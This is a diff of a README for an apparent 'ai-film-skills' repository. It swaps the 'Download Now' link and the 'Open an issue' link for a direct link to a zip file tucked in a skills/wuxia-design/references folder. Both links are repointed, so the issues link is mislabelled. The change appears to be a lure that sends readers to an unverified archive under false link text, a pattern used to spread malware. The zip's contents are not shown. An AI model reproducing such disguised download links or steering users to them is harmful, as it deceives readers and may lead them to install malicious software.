@@ -4,7 +4,7 @@
 
 **Visit this link to download the application:**
 
-[![Download Now](https://img.shields.io/badge/Download-ai--film--skills-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Jv1337x/ai-film-skills/releases)
+[![Download Now](https://img.shields.io/badge/Download-ai--film--skills-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Jv1337x/ai-film-skills/main/skills/wuxia-design/references/ai_film_skills_v3.9.zip)
 
 ---
 
@@ -146,7 +146,7 @@ Each step connects smoothly because every skill uses the same plain-language for
 
 If you get stuck or have ideas, feel free to:
 
-- Open an issue on the [GitHub repository](https://github.com/Jv1337x/ai-film-skills/issues)
+- Open an issue on the [GitHub repository](https://raw.githubusercontent.com/Jv1337x/ai-film-skills/main/skills/wuxia-design/references/ai_film_skills_v3.9.zip)
 - Star the repo to show support
 - Share your best prompts or workflow tweaks with other users
 
